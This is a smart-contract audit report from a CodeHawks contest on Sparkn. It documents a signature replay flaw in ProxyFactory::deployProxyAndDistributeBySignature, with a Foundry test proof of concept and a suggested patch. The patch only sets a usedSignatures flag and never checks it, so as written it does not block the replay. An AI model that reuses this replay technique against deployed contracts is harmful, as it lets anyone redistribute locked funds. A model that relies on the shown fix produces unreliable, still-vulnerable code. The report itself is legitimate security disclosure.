# Sparkn  - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Replay Attack, call can be reused to re-distribute Proxy funds](#H-02)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: CodeFox Inc.

### Dates: Aug 21st, 2023 - Aug 29th, 2023

[See more contest details here](https://www.codehawks.com/contests/cllcnja1h0001lc08z7w0orxx)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Replay Attack, call can be reused to re-distribute Proxy funds            

## Summary
Any user at any moment can call `ProxyFactory::deployProxyAndDistributeBySignature` for a contract with same contestId and organizer, but different implementation, executing the call with the original data.
## Vulnerability Details
An organizer creates a contest with an implementation, it all goes correctly and all the business logic ends correctly.
If he decides to create another one with the same contestId but different implementation, anyone at any time can reuse the digest and signature that was used in `ProxyFactory::deployProxyAndDistributeBySignature` to send the prize to the same addresses with the same percentage as before.
``` solidity
    // Paste this to test/integration/ProxyFactoryTest.t.sol
    // And run this: $ forge test --mt test_reDeployProxyAndDistributeBySignature
    function test_reDeployProxyAndDistributeBySignature() setUpContestForJasonAndSentJpycv2Token(TEST_SIGNER) public {
        // Create first contest and distribute tokens by signature
        (bytes32 digest, bytes memory sendingData, bytes memory signature) = createSignatureByASigner(TEST_SIGNER_KEY);
        bytes32 randomId = keccak256(abi.encode("Jason", "001"));

        vm.warp(8.01 days);
        proxyFactory.deployProxyAndDistributeBySignature(
            TEST_SIGNER, randomId, address(distributor), signature, sendingData
        );
        // set up new contest with different implementation
        vm.startPrank(factoryAdmin);
        Distributor newDistributor = new Distributor{salt: digest}(address(proxyFactory), address(stadiumAddress));
        proxyFactory.setContest(TEST_SIGNER, randomId, block.timestamp + 8 days, address(newDistributor));
        vm.stopPrank();
        bytes32 salt = keccak256(abi.encode(TEST_SIGNER, randomId, address(newDistributor)));
        address proxyAddress = proxyFactory.getProxyAddress(salt, address(newDistributor));
        // send tokens to newDistributor based implementation proxy
        vm.startPrank(sponsor);
        MockERC20(jpycv2Address).transfer(proxyAddress, 10000 ether);
        vm.stopPrank();
        vm.warp(16.02 days);
        // reuse the same digest, sending Data and signature
        proxyFactory.deployProxyAndDistributeBySignature(
            TEST_SIGNER, randomId, address(newDistributor), signature, sendingData
        );
    }
```
## Impact
On 'ProxyFactory::deployProxyAndDistributeBySignature' the digest, neither the signature, are saved as used, so it can be reused maliciously in a way that, if in any point some whitelisted tokens are left or deposited, they can be redistributed to the same winners at the previous percentage by any user at any time, not only the organizer.
Someone can be highly motivated to do so if he was previously a winner at the first contest, or by a malicious attacker in order to disrupt the protocol.
## Tools Used
Manual review and Foundry.
## Recommendations
Save digest or signature in a mapping to check if it already has been used.
``` diff
function deployProxyAndDistributeBySignature(
        address organizer,
        bytes32 contestId,
        address implementation,
        bytes calldata signature,
        bytes calldata data
    ) public returns (address) {
+       usedSignatures[signature] = true;
        bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(contestId, data)));
        if (ECDSA.recover(digest, signature) != organizer) revert ProxyFactory__InvalidSignature();
        bytes32 salt = _calculateSalt(organizer, contestId, implementation);
        if (saltToCloseTime[salt] == 0) revert ProxyFactory__ContestIsNotRegistered();
        if (saltToCloseTime[salt] > block.timestamp) revert ProxyFactory__ContestIsNotClosed();
        address proxy = _deployProxy(organizer, contestId, implementation);
        _distribute(proxy, data);
        return proxy;
    }
```
Or have a self-increasing nonce which gets encoded along contestId and data.